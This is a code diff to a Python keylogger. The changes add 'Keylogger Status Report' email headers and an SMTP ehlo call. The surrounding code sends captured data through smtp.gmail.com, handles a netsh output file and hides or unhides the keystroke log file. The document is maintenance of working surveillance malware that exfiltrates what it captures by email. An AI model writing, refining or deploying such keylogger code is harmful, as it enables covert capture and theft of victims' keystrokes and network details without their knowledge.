@@ -77,6 +77,14 @@ def main():
                 file.close()
                 remove("netsh.txt")
 
+            header = (
+                f"To: {to_addr}\n"
+                f"From: {email}\n"
+                f"Subject: Keylogger Status Report\n"
+            )
+
+            msg = header + msg
+
             try:
                 print("[INFO]\tSending status email...")
                 server.sendmail(email, to_addr, msg)
@@ -303,6 +311,14 @@ def main():
         if IsAccountActive:
             msg = "Keylogger deactivated by user..."
 
+            header = (
+                f"To: {to_addr}\n"
+                f"From: {email}\n"
+                f"Subject: Keylogger Status Report\n"
+            )
+
+            msg = header + msg
+
             try:
                 print("[INFO]\tSending status email...")
                 server.sendmail(email, to_addr, msg)
@@ -390,6 +406,7 @@ try:
     try:
         print("[INFO]\tConnecting to smtp.gmail.com:587")
         server = SMTP("smtp.gmail.com", 587)
+        server.ehlo()
         server.starttls()
 
         try:
@@ -419,7 +436,7 @@ except KeyboardInterrupt:
         terminal("attrib -h log.txt")
 
     if environment() == "Linux":
-        terminal(f"mv -fv .log.txt log.txt")
+        terminal("mv -fv .log.txt log.txt")
 
     Beep(1200, 2000)
 
